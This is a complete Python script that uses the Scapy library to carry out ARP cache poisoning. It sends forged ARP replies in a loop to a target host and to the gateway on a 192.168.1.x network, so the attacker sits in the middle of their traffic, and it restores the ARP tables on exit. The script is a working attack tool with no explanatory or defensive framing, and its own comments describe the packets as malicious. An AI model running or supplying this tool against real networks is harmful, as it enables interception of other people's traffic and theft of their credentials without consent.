from scapy.all import ARP, Ether, send, srp
import time
import sys

def get_mac(ip):
    # Function to get the MAC address of a given IP
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, host_ip):
    # Spoofing function to send malicious ARP responses
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for IP {target_ip}")
        return

    # Craft ARP packet to target, poisoning cache
    spoof_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(spoof_packet, verbose=False)

def restore(target_ip, host_ip):
    # Function to restore the network's ARP table
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if target_mac is None or host_mac is None:
        print(f"Could not find MAC address for IP {target_ip} or {host_ip}")
        return

    # Craft packet to correct ARP tables
    restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(restore_packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = "192.168.1.10"  # Target IP
    gateway_ip = "192.168.1.1"  # Gateway IP

    try:
        print("[*] Starting ARP spoof...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)  # Delay between spoofing packets
    except KeyboardInterrupt:
        print("[*] Stopping ARP spoof...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Network restored.")
